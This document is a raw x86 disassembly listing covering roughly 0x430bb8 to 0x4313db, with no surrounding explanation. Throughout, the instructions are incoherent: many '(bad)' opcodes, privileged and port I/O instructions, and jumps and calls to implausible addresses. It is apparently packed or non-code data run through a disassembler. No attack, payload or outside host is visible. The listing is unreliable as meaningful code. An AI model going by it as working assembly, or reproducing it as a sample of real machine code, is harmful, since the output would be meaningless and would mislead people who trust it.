  430bb8:	inc    ebp
  430bb9:	leave  
  430bba:	add    DWORD PTR [ecx+0x28],eax
  430bbd:	and    esp,edi
  430bbf:	inc    ecx
  430bc0:	jne    0x430ba9
  430bc2:	add    DWORD PTR [edx+0x1c],eax
  430bc5:	enter  0xc38b,0x14
  430bc9:	mov    edx,DWORD PTR [edx-0x17275af]
  430bcf:	clc    
  430bd0:	enter  0xd345,0x56
  430bd4:	div    DWORD PTR [ebp+0x50]
  430bd7:	mov    eax,0x7c80ece
  430bdc:	rol    DWORD PTR [esi],cl
  430bde:	div    DWORD PTR [ebp+0x50]
  430be1:	cmp    ecx,edx
  430be3:	pop    esi
  430be4:	dec    BYTE PTR [edx]
  430be6:	in     al,dx
  430be7:	inc    edx
  430be8:	sub    ebp,ebp
  430bea:	inc    eax
  430beb:	(bad)  
  430bec:	push   eax
  430bed:	add    edx,DWORD PTR [eax-0x13]
  430bf0:	push   edi
  430bf1:	add    dh,dh
  430bf3:	leave  
  430bf4:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430bf8:	add    BYTE PTR [ecx+0x0],dl
  430bfb:	inc    ebp
  430bfc:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430c02:	add    BYTE PTR [eax-0x7fbf448],bh
  430c08:	add    al,0x2
  430c0a:	jmp    0x57eb764
  430c0f:	jne    0x430bf9
  430c11:	mov    eax,DWORD PTR [edx]
  430c13:	or     BYTE PTR [eax],al
  430c15:	inc    ecx
  430c16:	stc    
  430c17:	jmp    0xe7824c52
  430c1c:	jge    0x430c5f
  430c1e:	mov    esi,ebp
  430c20:	lock ret 0x7d
  430c24:	and    ecx,DWORD PTR [ebx-0x171777]
  430c2a:	add    bh,bh
  430c2c:	aad    0xd7
  430c2e:	add    dh,cl
  430c30:	clts   
  430c32:	(bad)  
  430c33:	call   0xffce0b38
  430c38:	hlt    
  430c39:	iret   
  430c3a:	jge    0x430c12
  430c3c:	rol    DWORD PTR [esi-0x80],cl
  430c3f:	cmc    
  430c40:	or     BYTE PTR [edi-0x27],cl
  430c43:	(bad)  
  430c44:	out    dx,al
  430c45:	mov    eax,DWORD PTR [ebx]
  430c47:	(bad)  
  430c48:	pop    esi
  430c49:	push   es
  430c4a:	cmp    al,0xe8
  430c4c:	sar    edi,0x8
  430c4f:	inc    DWORD PTR [edi]
  430c51:	inc    esi
  430c52:	(bad)  
  430c53:	loop   0x430cd3
  430c55:	push   edi
  430c56:	push   cs
  430c57:	push   ebx
  430c58:	add    BYTE PTR [ebx+0x24008b56],cl
  430c5e:	add    BYTE PTR [ebp+0x50],al
  430c61:	push   eax
  430c62:	add    DWORD PTR [ebx+0x757d1834],ecx
  430c68:	sub    edx,DWORD PTR [esi-0x24]
  430c6b:	jne    0x430c23
  430c6d:	lods   eax,DWORD PTR ds:[esi]
  430c6e:	mov    edx,DWORD PTR [edx-0x34]
  430c71:	dec    esi
  430c72:	out    0x83,eax
  430c74:	into   
  430c75:	push   edi
  430c77:	loopne 0x430c47
  430c79:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430c7d:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430c84:	rol    DWORD PTR [edx],0x8
  430c87:	mov    esp,ecx
  430c89:	cmp    DWORD PTR [ebx],0xc
  430c8c:	mov    esi,0x5001c0
  430c91:	push   eax
  430c92:	push   cs
  430c93:	push   eax
  430c94:	(bad)  
  430c95:	sub    edx,edi
  430c97:	push   esi
  430c98:	adc    al,0xcb
  430c9a:	ins    DWORD PTR es:[edi],dx
  430c9b:	mov    eax,0x203e8
  430ca0:	add    al,ah
  430ca2:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430ca9:	add    dh,al
  430cab:	add    ah,ch
  430cad:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430cb3:	pop    ecx
  430cb4:	or     eax,ebx
  430cb6:	cli    
  430cb7:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430cbd:	lea    ebp,[ebx]
  430cbf:	mov    edx,DWORD PTR [edx-0x4]
  430cc2:	dec    ecx
  430cc3:	inc    ebp
  430cc4:	shr    BYTE PTR [ebx],0x4b
  430cc7:	and    al,0x0
  430cc9:	(bad)  
  430cca:	jne    0x430d11
  430ccc:	pop    eax
  430ccd:	mov    al,0x5a
  430ccf:	call   0x1420f2e
  430cd4:	and    al,0x85
  430cd6:	push   edx
  430cd7:	add    BYTE PTR [eax+eax*1+0x0],ah
  430cdb:	dec    ebp
  430cdc:	mov    cl,0x23
  430cde:	jmp    0x430ccc
  430ce0:	mov    al,0xe7
  430ce2:	call   0x1390fd0
  430ce7:	shr    DWORD PTR [eax+ebx*2],cl
  430cea:	lock (bad) 
  430cec:	adc    eax,0x757f008d
  430cf1:	out    0x58,eax
  430cf3:	cmp    al,0x7
  430cf5:	pop    edx
  430cf6:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430cfd:	push   ecx
  430cfe:	cld    
  430cff:	mov    esi,0x3b0175
  430d04:	and    al,0xb0
  430d06:	xor    BYTE PTR [edx+0x1],0x8b
  430d0a:	add    ah,bh
  430d0c:	mov    edi,DWORD PTR [ebp-0x4]
  430d0f:	psubsw mm7,QWORD PTR [edi]
  430d12:	add    DWORD PTR [ebp+0x0],ebp
  430d15:	rcr    eax,1
  430d17:	mov    edi,ecx
  430d19:	and    eax,DWORD PTR [eax]
  430d1b:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430d21:	call   0x130100a
  430d26:	add    al,cl
  430d28:	mov    ebp,esi
  430d2a:	aam    0x83
  430d2c:	or     DWORD PTR [ecx],eax
  430d2e:	jne    0x430d21
  430d30:	mov    eax,DWORD PTR [eax]
  430d32:	aam    0x0
  430d34:	dec    ebp
  430d35:	jne    0x430cc2
  430d37:	cmp    ebx,eax
  430d39:	jb     0x430d88
  430d3b:	jmp    0x430cc8
  430d3d:	mov    ebx,esp
  430d3f:	int3   
  430d40:	dec    ebp
  430d41:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430d48:	mov    edx,0x8b0a8b
  430d4d:	cmp    ecx,DWORD PTR [eax]
  430d4f:	jb     0x430d28
  430d51:	pop    edx
  430d52:	push   edi
  430d53:	cli    
  430d54:	pop    es
  430d55:	mov    eax,ecx
  430d57:	jb     0x430d5b
  430d59:	add    DWORD PTR [ebx],0xa
  430d5c:	mov    eax,DWORD PTR [ebx]
  430d5e:	int3   
  430d5f:	add    bh,BYTE PTR [esi+0x75d10006]
  430d65:	jmp    0x430cf2
  430d67:	mov    al,0xe8
  430d69:	call   0x1040feb
  430d6e:	add    edx,DWORD PTR [ecx+ecx*8]
  430d71:	pop    edi
  430d72:	or     BYTE PTR [ecx-0x73],bl
  430d75:	pop    ecx
  430d76:	inc    edi
  430d77:	xor    al,0xeb
  430d79:	push   ecx
  430d7a:	mov    edi,DWORD PTR [edx+0xc506cc]
  430d80:	call   0xb20e85
  430d85:	int3   
  430d86:	sbb    BYTE PTR [esi],ch
  430d88:	inc    ebp
  430d89:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430d8f:	call   0x9c0ffe
  430d94:	or     BYTE PTR [ebx-0x73],dl
  430d97:	cmp    al,0x47
  430d99:	mov    al,0x1
  430d9b:	jb     0x430d9d
  430d9d:	mov    al,0x10
  430d9f:	push   eax
  430da0:	add    al,0x75
  430da2:	add    BYTE PTR [ebx],ch
  430da4:	add    ebx,esp
  430da6:	int3   
  430da7:	jne    0x430db9
  430da9:	movsx  edx,cl
  430dac:	add    DWORD PTR [eax],eax
  430dae:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430db5:	mov    gs,edi
  430db7:	add    BYTE PTR [eax-0x50],ch
  430dba:	add    al,ch
  430dbc:	mov    eax,DWORD PTR [ecx]
  430dbe:	sub    eax,DWORD PTR [eax]
  430dc0:	jb     0x430e37
  430dc2:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430dc6:	jge    0x430db0
  430dc8:	add    al,0x1
  430dca:	add    DWORD PTR [eax],0x0
  430dcd:	jne    0x430dcf
  430dcf:	je     0x430e16
  430dd1:	mov    eax,DWORD PTR [edi]
  430dd3:	ror    BYTE PTR [ebp+0x4d],1
  430dd6:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430ddd:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430de3:	mov    DWORD PTR [ebx],ebp
  430de5:	fadd   DWORD PTR [eax+0x75]
  430de8:	inc    eax
  430de9:	pop    eax
  430dea:	lea    ebx,[ecx+0x4f]
  430ded:	push   0xb1000003
  430df2:	out    dx,eax
  430df3:	add    ebp,DWORD PTR [edx+edx*2]
  430df6:	add    BYTE PTR [ebx+ecx*4],bh
  430df9:	mov    ch,BYTE PTR [ebx]
  430dfb:	jb     0x430e6f
  430dfd:	add    al,0x89
  430dff:	push   eax
  430e00:	call   0x842b5b72
  430e05:	add    DWORD PTR [eax+eax*1],eax
  430e08:	jae    0x430e1e
  430e0a:	icebp  
  430e0b:	inc    ebp
  430e0c:	mov    eax,DWORD PTR gs:[ecx]
  430e0f:	int3   
  430e10:	out    dx,al
  430e11:	loopne 0x430e60
  430e13:	sub    eax,DWORD PTR [edx]
  430e15:	push   0xffffff83
  430e17:	pop    esi
  430e18:	push   cs
  430e19:	jl     0x430e34
  430e1b:	add    al,0xaf
  430e1d:	xor    eax,0x832b6d00
  430e22:	mov    eax,DWORD PTR [edx]
  430e24:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430e2a:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430e30:	inc    ebp
  430e31:	shr    ebx,0x3
  430e34:	or     DWORD PTR [eax],0x4
  430e37:	push   0xffffffa5
  430e39:	pop    esi
  430e3a:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  430e41:	jmp    0x430ea0
  430e43:	mov    edi,0xff0272
  430e48:	fdivr  QWORD PTR [ebp+0x5d]
  430e4b:	push   0x4e
  430e4d:	pop    ecx
  430e4e:	call   0x435253
  430e53:	mov    DWORD PTR [ebx],eax
  430e55:	in     al,0xc8
  430e57:	rol    BYTE PTR [ebp-0x75],0xc1
  430e5b:	call   0xad103c
  430e60:	pop    esi
  430e61:	enter  0xceff,0x8b
  430e65:	repz mov ecx,DWORD PTR [ebp-0x34]
  430e69:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  430e70:	je     0x430e72
  430e72:	or     DWORD PTR [ebx-0x74183b24],eax
  430e78:	jne    0x430e5e
  430e7a:	jmp    0x430e75
  430e7c:	push   DWORD PTR [edx-0x24]
  430e7f:	push   0x4d
  430e81:	pop    ecx
  430e82:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  430e86:	jge    0x430e8e
  430e88:	mov    eax,eax
  430e8a:	sub    ebp,DWORD PTR [edx+0x24]
  430e8d:	pop    esi
  430e8e:	inc    ebp
  430e8f:	mov    esp,0x8b6077
  430e94:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  430e9a:	lods   al,BYTE PTR ds:[esi]
  430e9b:	add    BYTE PTR [ebx],bh
  430e9d:	enter  0xce73,0x49
  430ea1:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  430ea9:	stc    
  430eaa:	jge    0x430f1e
  430eac:	jnp    0xdd42921b
  430eb2:	call   0xc60f88
  430eb7:	fadd   st(0),st
  430eb9:	dec    esi
  430eba:	ins    BYTE PTR es:[edi],dx
  430ebb:	stc    
  430ebc:	cmp    al,0x73
  430ebe:	push   ebp
  430ebf:	mov    eax,0xf8028b
  430ec4:	jne    0x430e87
  430ec6:	mov    esi,ecx
  430ec8:	mov    esp,DWORD PTR [ebp+0x2c]
  430ecb:	add    edi,DWORD PTR [ebp-0x24]
  430ece:	sub    esp,eax
  430ed0:	and    al,0x45
  430ed2:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  430ed8:	sbb    al,0xee
  430eda:	pop    esi
  430edb:	call   0x830f0b
  430ee0:	fsubr  st,st(3)
  430ee2:	sti    
  430ee3:	add    BYTE PTR gs:[ecx],bh
  430ee6:	add    eax,esp
  430ee8:	add    DWORD PTR [esi],eax
  430eea:	rol    DWORD PTR [ebp+0x8],0x29
  430eee:	mov    esp,eax
  430ef0:	clc    
  430ef1:	jne    0x430f68
  430ef3:	mov    eax,0x8b0673
  430ef8:	loopne 0x430f3f
  430efa:	loopne 0x430e85
  430efc:	lods   al,BYTE PTR ds:[esi]
  430efd:	int3   
  430efe:	inc    ebp
  430eff:	mov    DWORD PTR gs:[eax+edi*8],eax
  430f03:	add    al,0xc3
  430f05:	sub    ecx,DWORD PTR [ebp+0x47]
  430f08:	(bad)  
  430f0a:	shr    BYTE PTR [ebp-0x1f],0xe8
  430f0e:	add    eax,DWORD PTR [eax]
  430f10:	call   0x644d015
  430f15:	add    esi,DWORD PTR [esi-0x3b2efc83]
  430f1b:	dec    esi
  430f1c:	ins    DWORD PTR es:[edi],dx
  430f1d:	in     al,dx
  430f1e:	lea    eax,[eax]
  430f20:	inc    ebp
  430f21:	inc    ebp
  430f22:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  430f28:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  430f32:	and    al,0xdc
  430f34:	ror    DWORD PTR [edx+0x24],0xf7
  430f38:	or     BYTE PTR [ebp+0x4c],dh
  430f3b:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  430f3f:	stos   BYTE PTR es:[edi],al
  430f40:	adc    edx,edi
  430f42:	inc    esp
  430f43:	add    edi,DWORD PTR [eax]
  430f45:	jne    0x430f2a
  430f47:	mov    DWORD PTR [eax-0x7449db04],ecx
  430f4d:	cmp    ecx,DWORD PTR [edi]
  430f4f:	sub    BYTE PTR [ebp-0x7e],dl
  430f52:	sar    ebp,0xb
  430f55:	jmp    FWORD PTR [edi+0x2400392a]
  430f5b:	sub    esi,DWORD PTR [ebx-0x73]
  430f5e:	mov    esp,DWORD PTR [ecx+edi*4]
  430f61:	mov    ecx,DWORD PTR [eax]
  430f63:	and    BYTE PTR [eax],al
  430f65:	jne    0x430f31
  430f67:	sub    ebp,ecx
  430f69:	sbb    BYTE PTR [esi+0x32],ah
  430f6c:	dec    ebp
  430f6d:	push   ebp
  430f6e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  430f74:	ret    
  430f75:	mov    edx,ebp
  430f77:	leave  
  430f78:	sub    DWORD PTR [esi+0x24],ebx
  430f7b:	ret    0x2b
  430f7e:	pop    ax
  430f80:	push   ebp
  430f81:	rol    BYTE PTR [ebx],0xeb
  430f84:	add    DWORD PTR [ecx+0x6c0001],0x40
  430f8b:	jb     0x430fe2
  430f8d:	ret    
  430f8e:	in     al,dx
  430f8f:	jecxz  0x430f1c
  430f91:	push   esi
  430f92:	xchg   esp,eax
  430f93:	jne    0x430f95
  430f95:	cmp    edx,DWORD PTR [esi+0x1c]
  430f98:	jne    0x430f7e
  430f9a:	mov    eax,DWORD PTR [ebp-0x77]
  430f9d:	ror    DWORD PTR [ebx+0x899408],0xe0
  430fa4:	mov    esi,DWORD PTR [ebp-0x75]
  430fa7:	pop    esi
  430fa8:	nop
  430fa9:	mov    eax,DWORD PTR [eax]
  430fab:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  430fb1:	add    al,0x0
  430fb3:	inc    ebp
  430fb4:	mov    eax,DWORD PTR [ebx]
  430fb6:	mov    ebp,ebx
  430fb8:	cmp    al,0xf
  430fba:	or     al,al
  430fbc:	inc    ebp
  430fbd:	inc    ebp
  430fbe:	xor    eax,0x8bc89c8b
  430fc3:	ins    BYTE PTR es:[edi],dx
  430fc4:	cld    
  430fc5:	add    BYTE PTR [edi+0x536c16c0],dh
  430fcb:	add    BYTE PTR [ecx-0x5],dl
  430fce:	add    eax,0x17200
  430fd3:	sbb    al,0x85
  430fd5:	dec    esp
  430fd6:	je     0x431010
  430fd8:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  430fdc:	add    BYTE PTR [ebx],bh
  430fde:	(bad)  
  430fdf:	and    al,0x34
  430fe1:	jae    0x430f7f
  430fe3:	mov    cl,cl
  430fe5:	inc    DWORD PTR [esp]
  430fe8:	push   ebp
  430fe9:	shr    esp,0x8
  430fec:	in     al,dx
  430fed:	push   esp
  430fee:	add    DWORD PTR [eax],esp
  430ff0:	add    bl,cl
  430ff2:	inc    ebp
  430ff3:	mov    bh,0x89
  430ff5:	add    ah,bh
  430ff7:	jmp    0xca771f41
  430ffc:	pushf  
  430ffd:	dec    esp
  430ffe:	push   ebx
  430fff:	and    BYTE PTR [ebp+0x17],al
  431002:	xor    eax,0x56009cd9
  431007:	add    BYTE PTR [ebp+0x2b],al
  43100a:	in     eax,0xc1
  43100c:	inc    ebp
  43100d:	add    eax,0xc601d8
  431012:	mov    al,0xc6
  431015:	ins    BYTE PTR es:[edi],dx
  431016:	mov    DWORD PTR [eax+0x6a],0xc805c6c1
  43101d:	dec    esp
  43101e:	xor    esp,DWORD PTR [eax]
  431020:	(bad)  
  431021:	fxch   st(1)
  431023:	sub    DWORD PTR [ebx],esi
  431025:	add    BYTE PTR [edx-0x40],bl
  431028:	mov    eax,0x248d8d00
  43102e:	xor    eax,0x188b0fc3
  431033:	push   ecx
  431034:	fimul  DWORD PTR [edx+0x8801d9]
  43103a:	or     DWORD PTR [ebx+0x36ed0806],0x45
  431041:	xor    ebx,ebp
  431043:	mov    al,BYTE PTR [ebp+0x1]
  431046:	jmp    0xdb4c554b
  43104b:	mov    dl,0x45
  43104d:	add    esi,ebp
  43104f:	add    BYTE PTR [ebp+0xe],al
  431052:	sub    DWORD PTR [edx+0x2e0145],eax
  431058:	inc    ebp
  431059:	or     BYTE PTR [ecx+ecx*2-0xa],bh
  43105d:	add    eax,DWORD PTR [edi+eax*8-0x24]
  431061:	cld    
  431062:	mov    dh,0xa5
  431064:	xor    edi,eax
  431066:	add    eax,DWORD PTR [ebp+0x46]
  431069:	prefetcht0 BYTE PTR [ecx-0x2]
  43106d:	xor    eax,0x7c60872
  431072:	mov    esp,0xbd32c69a
  431077:	pop    esi
  431078:	mov    cl,0xbe
  43107b:	or     al,0xc6
  43107d:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431084:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43108b:	add    dh,al
  43108d:	mov    eax,ebx
  43108f:	xor    DWORD PTR [ebx],0x35008dbc
  431095:	mov    ecx,DWORD PTR [edi]
  431097:	sbb    al,0x18
  431099:	inc    ebp
  43109a:	fcmovb st,st(7)
  43109c:	fxtract 
  43109e:	mov    BYTE PTR [ebp-0x38f7077d],al
  4310a4:	in     eax,dx
  4310a5:	call   0xf942962f
  4310aa:	inc    esi
  4310ac:	inc    ebp
  4310ad:	les    ecx,FWORD PTR [ebx-0x103a273a]
  4310b3:	push   edi
  4310b4:	adc    eax,DWORD PTR [ebp-0x77]
  4310b7:	out    0x8b,eax
  4310b9:	inc    ebp
  4310ba:	cmp    BYTE PTR [ecx],ch
  4310bc:	inc    DWORD PTR [ebp+0x3b]
  4310bf:	inc    ebp
  4310c0:	jne    0x4310f0
  4310c2:	(bad)  
  4310c3:	(bad)  
  4310c4:	mov    eax,0xf87c8545
  4310c9:	test   BYTE PTR [ebp-0x47],0xea
  4310cd:	add    BYTE PTR [eax+eax*1-0x3b03bb75],bl
  4310d4:	xor    BYTE PTR [esi+0x3003301],0x38
  4310db:	inc    esi
  4310dc:	test   DWORD PTR [eax],ebx
  4310de:	add    bh,dh
  4310e0:	add    BYTE PTR [edx+0x45],dh
  4310e3:	(bad)  
  4310e4:	mov    ebx,esp
  4310e6:	jl     0x4310ae
  4310e8:	add    ch,bl
  4310ea:	mov    esi,eax
  4310ec:	mov    ebx,esi
  4310ee:	cld    
  4310ef:	mov    BYTE PTR [eax+0xc601df],0xe0
  4310f6:	cmp    dh,al
  4310f8:	imul   esp,ecx,0xe28dc600
  4310fe:	shl    DWORD PTR [ebx],1
  431100:	mov    DWORD PTR [ebp+0xfff3564],ecx
  431106:	mov    ebx,DWORD PTR [eax]
  431108:	data16 fiadd DWORD PTR [ebp-0x770027]
  43110f:	add    eax,0x7
  431112:	in     ax,dx
  431114:	test   DWORD PTR [ebp-0x1],eax
  431117:	jmp    0xe48a571b
  43111c:	inc    bp
  43111e:	test   eax,esp
  431120:	inc    DWORD PTR [ebp-0x1]
  431123:	cmc    
  431124:	rol    BYTE PTR [ebp+0x66],0xdf
  431128:	test   DWORD PTR [ebp-0x1],eax
  43112b:	in     al,dx
  43112c:	inc    DWORD PTR [ebp+0x47]
  43112f:	out    0x66,eax
  431131:	inc    ebp
  431132:	test   DWORD PTR [edi+edi*8-0xa],edi
  431136:	inc    DWORD PTR [eax+eax*8-0x44]
  43113a:	data16 mov dh,0x85
  43113d:	xor    edi,edi
  43113f:	add    edi,edi
  431141:	inc    esi
  431142:	inc    edi
  431143:	sbb    BYTE PTR [esi-0x2],ah
  431146:	test   DWORD PTR [edx-0x1],esi
  431149:	(bad)  
  43114a:	(bad)  
  43114b:	cmp    bh,al
  43114d:	dec    DWORD PTR [ecx-0x278b77]
  431153:	dec    ebp
  431154:	cmp    DWORD PTR [eax+0x7189fc03],0x76
  43115b:	add    edi,edi
  43115d:	lea    edi,[eax+0xff99ff]
  431163:	enter  0xe89,0x78
  431167:	inc    ebp
  431168:	push   DWORD PTR ds:0xc7829cb8
  43116e:	add    BYTE PTR [eax-0x7857a77],bh
  431174:	inc    DWORD PTR [ebp-0x48]
  431177:	mov    edx,edi
  431179:	mov    WORD PTR [eax],es
  43117b:	add    BYTE PTR [ecx-0xf083c7],cl
  431181:	pop    edi
  431182:	add    DWORD PTR [eax],0xffffffe4
  431185:	mov    ecx,DWORD PTR [ecx-0x7f8104]
  43118b:	add    DWORD PTR [eax+0x382700],edi
  431191:	inc    ebp
  431192:	mov    DWORD PTR [ebx+0x4c8080],ecx
  431198:	add    BYTE PTR [ecx+0x4f45b866],cl
  43119e:	lea    eax,[eax]
  4311a0:	add    eax,0x89660878
  4311a5:	test   DWORD PTR [edi+edi*8-0x381600bb],eax
  4311ac:	loopne 0x431137
  4311ae:	(bad)  
  4311af:	data16 aam 0xff
  4311b2:	in     al,dx
  4311b3:	cmp    DWORD PTR [edi+edi*1+0x45],0xffffff89
  4311b8:	pop    ecx
  4311b9:	push   0x8ddaff18
  4311be:	jmp    0x4311bf
  4311c0:	mov    BYTE PTR [ecx-0x8a95c0],cl
  4311c6:	lea    eax,[ebx-0x767aee30]
  4311cc:	(bad)  
  4311cd:	ins    BYTE PTR es:[edi],dx
  4311ce:	(bad)  
  4311cf:	inc    DWORD PTR [ebp-0xfb0173]
  4311d5:	mov    DWORD PTR [ebx+0x53fff46e],ecx
  4311db:	adc    DWORD PTR [ecx+0x3d],0x33
  4311df:	mov    DWORD PTR [ebx+0xff7270],edi
  4311e5:	(bad)  
  4311e6:	ret    
  4311e7:	add    cl,BYTE PTR [ebx-0x3f8d0377]
  4311ed:	call   DWORD PTR [eax-0x75]
  4311f0:	inc    ebp
  4311f1:	mov    ax,WORD PTR [ebp-0xff0068]
  4311f8:	mov    eax,0x85ff66b0
  4311fe:	add    edi,edi
  431200:	add    bh,bh
  431202:	(bad)  
  431203:	stc    
  431204:	inc    DWORD PTR [eax]
  431206:	or     BYTE PTR [esi+0x45],ah
  431209:	test   DWORD PTR [ebp-0x7e008a01],eax
  43120f:	outs   dx,BYTE PTR ds:[esi]
  431210:	pop    DWORD PTR [eax]
  431212:	adc    ah,BYTE PTR [esi-0x78]
  431215:	test   DWORD PTR [eax-0x1],esi
  431218:	mov    ecx,0x6b4fff
  43121d:	add    cl,al
  43121f:	mov    WORD PTR [ebp-0x3f0078],ax
  431226:	mov    eax,eax
  431228:	data16 push bp
  43122b:	test   DWORD PTR [ebp-0x76000201],ecx
  431231:	dec    esp
  431232:	mov    WORD PTR [eax],es
  431234:	ret    0x6666
  431237:	inc    ebp
  431238:	push   ebp
  431239:	mov    eax,0xf3478d
  43123e:	mov    DWORD PTR [ecx+0x47c28290],ecx
  431244:	pushw  0x55
  431247:	lea    ax,[ebp-0x1f]
  43124b:	(bad)  
  43124c:	mov    eax,edx
  43124e:	xchg   esp,eax
  43124f:	in     al,0x89
  431251:	cmc    
  431252:	xchg   esi,eax
  431253:	inc    ebp
  431254:	iret   
  431255:	fisttp WORD PTR [ecx+0x4a8d98e7]
  43125b:	ror    BYTE PTR [ebx+0x5532668a],1
  431261:	or     BYTE PTR [ebx+0x55186639],0x49
  431268:	(bad)  
  431269:	repz cmp eax,0xa0898945
  43126f:	mov    ah,0x89
  431271:	jmp    DWORD PTR [edx+0x66b0418d]
  431277:	inc    DWORD PTR [ebp+0x50]
  43127a:	add    DWORD PTR [ebp-0xd],0xffffffbe
  43127e:	mov    DWORD PTR [eax],ecx
  431280:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431281:	pop    es
  431282:	inc    ecx
  431283:	(bad)  
  431284:	call   0x366:0x3245
  43128a:	dec    ebp
  43128b:	push   eax
  43128c:	inc    bp
  43128e:	jge    0x431213
  431290:	mov    esp,DWORD PTR [esi-0x18]
  431293:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  431299:	add    DWORD PTR [ebx],esi
  43129b:	add    BYTE PTR [ebx],al
  43129d:	test   DWORD PTR [ebx],esi
  43129f:	(bad)  
  4312a0:	inc    WORD PTR [ebp+0x0]
  4312a4:	mov    eax,DWORD PTR [eax]
  4312a6:	call   0x8898c9db
  4312ab:	mov    esi,eax
  4312ad:	clc    
  4312ae:	ret    
  4312af:	rol    cl,0xa
  4312b2:	mov    DWORD PTR ds:0x7c0ec88,esi
  4312b8:	mov    edx,edi
  4312ba:	pushf  
  4312bb:	pop    es
  4312bc:	jmp    DWORD PTR [edx+0x66]
  4312bf:	add    BYTE PTR [ebp-0x990175],al
  4312c5:	inc    ebp
  4312c6:	test   DWORD PTR [ebx-0x2f00ea02],eax
  4312cc:	push   ebp
  4312cd:	mov    edi,eax
  4312cf:	mov    dh,BYTE PTR [eax+0x266ff51]
  4312d5:	push   ebp
  4312d6:	add    BYTE PTR [ebx-0x764b0777],al
  4312dc:	dec    DWORD PTR [esi+0x661851e8]
  4312e2:	add    BYTE PTR [ebp-0x7b],dl
  4312e5:	cmp    esi,0xfffffff3
  4312e8:	dec    DWORD PTR [ecx+0x51fe9285]
  4312ee:	jmp    DWORD PTR [esi-0x75]
  4312f1:	push   ebp
  4312f2:	hlt    
  4312f3:	data16 (bad) 
  4312f5:	dec    ebp
  4312f6:	ret    
  4312f7:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4312fd:	lea    edx,[eax-0x1]
  431300:	jne    0x4312d3
  431302:	dec    DWORD PTR [ecx-0x2f7a63f8]
  431308:	dec    BYTE PTR [ecx+0x51559eff]
  43130e:	mov    DWORD PTR [esi-0x4c],esp
  431311:	push   ebp
  431312:	jmp    DWORD PTR [esi-0x18]
  431315:	inc    ebp
  431316:	sbb    BYTE PTR [ebp-0x767acd00],cl
  43131c:	(bad)  
  43131d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43131e:	inc    eax
  431320:	test   DWORD PTR [esi-0x2],esp
  431323:	inc    ebp
  431324:	dec    DWORD PTR [ebp-0x760bde75]
  43132a:	(bad)  
  43132b:	test   al,0xc3
  43132d:	mov    DWORD PTR [ebp-0x769b56],ecx
  431333:	lods   al,BYTE PTR ds:[esi]
  431334:	push   eax
  431335:	inc    ebp
  431336:	jne    0x431347
  431338:	dec    DWORD PTR [ebp+0x8]
  43133b:	mov    eax,DWORD PTR [ebx]
  43133d:	sbb    al,0x0
  43133f:	(bad)  
  431340:	mov    eax,0xc14fc3
  431345:	mov    DWORD PTR [eax-0x64],edi
  431348:	inc    bp
  43134a:	test   DWORD PTR [edi],ecx
  43134c:	dec    DWORD PTR [ebp-0x1]
  43134f:	xor    eax,edi
  431351:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  431357:	inc    ebp
  431358:	xor    DWORD PTR [ebx],0x3f
  43135b:	mov    WORD PTR [ebp-0x1bc],ax
  431362:	lea    ecx,[ecx-0x767702]
  431368:	inc    esi
  431369:	(bad)  
  43136a:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  431371:	pushf  
  431372:	rol    DWORD PTR [ebp-0x72019a],0xff
  431379:	add    bh,bh
  43137b:	add    BYTE PTR [edi],cl
  43137d:	test   DWORD PTR [eax],eax
  43137f:	(bad)  
  431380:	dec    WORD PTR [ebp-0xff0031]
  431387:	mov    DWORD PTR [ecx-0xb748],ecx
  43138d:	lea    eax,[ebx+0x7cffc1b0]
  431393:	push   eax
  431394:	add    BYTE PTR [ebp+0x66],al
  431397:	xor    ecx,DWORD PTR [ebp-0xaf00fd]
  43139d:	test   eax,esi
  43139f:	(bad)  
  4313a0:	fdiv   st(7),st
  4313a2:	add    bh,bh
  4313a4:	data16 clc 
  4313a6:	lea    edx,[ebp-0x1]
  4313a9:	(bad)  
  4313aa:	dec    DWORD PTR [eax-0x72b50077]
  4313b0:	dec    DWORD PTR [eax-0x1237a73]
  4313b6:	(bad)  
  4313b7:	(bad)  
  4313b8:	(bad)  
  4313b9:	cdq    
  4313ba:	inc    DWORD PTR [eax]
  4313bc:	ja     0x431347
  4313be:	lea    edi,[eax-0x72000050]
  4313c4:	push   ecx
  4313c5:	mov    al,0x4d
  4313c7:	jmp    DWORD PTR [esi+0x50]
  4313ca:	mov    ch,0x45
  4313cc:	push   DWORD PTR [ebx]
  4313ce:	inc    DWORD PTR [ebx]
  4313d0:	push   ebx
  4313d1:	push   eax
  4313d2:	push   ecx
  4313d3:	test   DWORD PTR [ebx],esi
  4313d5:	(bad)  
  4313d6:	mov    ebx,0xff72ff
  4313db:	clc    
